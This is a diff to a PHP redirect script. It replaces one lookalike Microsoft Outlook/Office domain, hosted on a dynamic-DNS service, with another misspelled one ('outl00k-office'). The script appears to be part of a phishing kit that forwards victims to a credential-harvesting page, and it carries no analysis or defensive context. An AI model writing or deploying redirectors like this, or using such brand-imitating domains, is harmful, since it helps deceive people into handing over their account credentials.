@@ -1,7 +1,7 @@
 <?php 
   
 // Redirect browser 
-header("Location: https://officez-outloklive.camdvr.org/"); 
+header("Location: https://outl00k-office.accesscam.org/"); 
   
 exit; 
 ?> 
